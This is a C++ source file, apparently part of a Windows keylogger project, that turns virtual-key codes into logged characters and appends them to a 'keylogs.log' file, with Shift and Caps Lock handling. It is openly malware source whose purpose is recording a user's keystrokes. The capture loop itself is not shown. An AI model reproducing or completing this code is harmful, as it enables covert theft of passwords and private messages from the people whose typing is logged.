#include "pch.h"
#include "keylogger.h"

// write to file
void writeData(std::string text) {
	std::ofstream logFile;
	logFile.open("keylogs.log", std::fstream::app);
	logFile << text;
	logFile.close();
}

// check if caps key is on/off
bool isCaps() { return ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) ? true : false; }
bool isShift() { return ((GetKeyState(VK_SHIFT) & 0x8000) != 0) ? true : false; }

// log special keys
bool isKeyListed(int vkey) {
	switch (vkey) {
	case VK_LBUTTON:
		writeData("");
		return true;
	case VK_RBUTTON:
		writeData("");
		return true;
	case VK_RETURN:
		writeData("\n");
		return true;
	case VK_BACK:
		writeData(" [BACKSPACE] ");
		return true;
	case VK_TAB:
		writeData(" [TAB] ");
		return true;
	case VK_CAPITAL:
		writeData("");
		return true;
	case VK_SPACE:
		writeData(" ");
		return true;
	case VK_PRIOR:
		writeData(" [PAGE UP] ");
		return true;
	case VK_NEXT:
		writeData(" [PAGE DOWN] ");
		return true;
	case VK_END:
		writeData(" [END] ");
		return true;
	case VK_HOME:
		writeData(" [HOME] ");
		return true;
	case VK_LEFT:
		writeData(" [LEFT ARROW] ");
		return true;
	case VK_RIGHT:
		writeData(" [RIGHT ARROW] ");
		return true;
	case VK_UP:
		writeData(" [UP ARROW] ");
		return true;
	case VK_DOWN:
		writeData(" [DOWN ARROW] ");
		return true;
	case VK_SELECT:
		writeData(" [SELECT] ");
		return true;
	case VK_SNAPSHOT:
		writeData(" [PRINT SCREEN] ");
		return true;
	case VK_INSERT:
		writeData(" [INS] ");
		return true;
	case VK_DELETE:
		writeData(" [DEL] ");
		return true;
	case VK_SHIFT:
		writeData(" [SHIFT] ");
		return true;
	case VK_CONTROL:
		writeData(" [CTRL] ");
		return true;
	case VK_LWIN:
		writeData(" [WIN] ");
		return true;
	case VK_NUMLOCK:
		writeData(" [NUM LOCK] ");
		return true;
	case 0x30:
		if (isShift())
			writeData(")");
		else
			writeData("0");
		return true;
	case 0x31:
		if (isShift())
			writeData("!");
		else
			writeData("1");
		return true;
	case 0x32:
		if (isShift())
			writeData("@");
		else
			writeData("2");
		return true;
	case 0x33:
		if (isShift())
			writeData("#");
		else
			writeData("3");
		return true;
	case 0x34:
		if (isShift())
			writeData("$");
		else
			writeData("4");
		return true;
	case 0x35:
		if (isShift())
			writeData("%");
		else
			writeData("5");
		return true;
	case 0x36:
		if (isShift())
			writeData("^");
		else
			writeData("6");
		return true;
	case 0x37:
		if (isShift())
			writeData("&");
		else
			writeData("7");
		return true;
	case 0x38:
		if (isShift())
			writeData("*");
		else
			writeData("8");
		return true;
	case 0x39:
		if (isShift())
			writeData("(");
		else
			writeData("9");
		return true;
	case VK_NUMPAD0:
		writeData("0");
		return true;
	case VK_NUMPAD1:
		writeData("1");
		return true;
	case VK_NUMPAD2:
		writeData("2");
		return true;
	case VK_NUMPAD3:
		writeData("3");
		return true;
	case VK_NUMPAD4:
		writeData("4");
		return true;
	case VK_NUMPAD5:
		writeData("5");
		return true;
	case VK_NUMPAD6:
		writeData("6");
		return true;
	case VK_NUMPAD7:
		writeData("7");
		return true;
	case VK_NUMPAD8:
		writeData("8");
		return true;
	case VK_NUMPAD9:
		writeData("9");
		return true;
	case VK_SLEEP:
		writeData(" [SLEEP] ");
		return true;
	case VK_MULTIPLY:
		writeData("*");
		return true;
	case VK_ADD:
		writeData("+");
		return true;
	case VK_SEPARATOR:
		writeData("|");
		return true;
	case VK_SUBTRACT:
		writeData("-");
		return true;
	case VK_DECIMAL:
		writeData(".");
		return true;
	case VK_DIVIDE:
		writeData("/");
		return true;
	case VK_OEM_1:
		if (isShift())
			writeData(":");
		else
			writeData(";");
		return true;
	case VK_OEM_PLUS:
		if (isShift())
			writeData("+");
		else
			writeData("=");
		return true;
	case VK_OEM_COMMA:
		if (isShift())
			writeData("<");
		else
			writeData(",");
		return true;
	case VK_OEM_MINUS:
		if (isShift())
			writeData("_");
		else
			writeData("-");
		return true;
	case VK_OEM_PERIOD:
		if (isShift())
			writeData(">");
		else
			writeData(".");
		return true;
	case VK_OEM_2:
		if (isShift())
			writeData("?");
		else
			writeData("/");
		return true;
	case VK_OEM_3:
		if (isShift())
			writeData("~");
		else
			writeData("`");
		return true;
	case VK_OEM_4:
		if (isShift())
			writeData("{");
		else
			writeData("[");
		return true;
	case VK_OEM_5:
		if (isShift())
			writeData("|");
		else
			writeData("\\");
		return true;
	case VK_OEM_6:
		if (isShift())
			writeData("}");
		else
			writeData("]");
		return true;
	case VK_OEM_7:
		if (isShift())
			writeData("\"");
		else
			writeData("'");
		return true;
	case VK_F1:
		writeData(" [F1] ");
		return true;
	case VK_F2:
		writeData(" [F2] ");
		return true;
	case VK_F3:
		writeData(" [F3] ");
		return true;
	case VK_F4:
		writeData(" [F4] ");
		return true;
	case VK_F5:
		writeData(" [F5] ");
		return true;
	case VK_F6:
		writeData(" [F6] ");
		return true;
	case VK_F7:
		writeData(" [F7] ");
		return true;
	case VK_F8:
		writeData(" [F8] ");
		return true;
	case VK_F9:
		writeData(" [F9] ");
		return true;
	case VK_F10:
		writeData(" [F10] ");
		return true;
	case VK_F11:
		writeData(" [F11] ");
		return true;
	case VK_F12:
		writeData(" [F12] ");
		return true;
	default:
		return false;
	}
}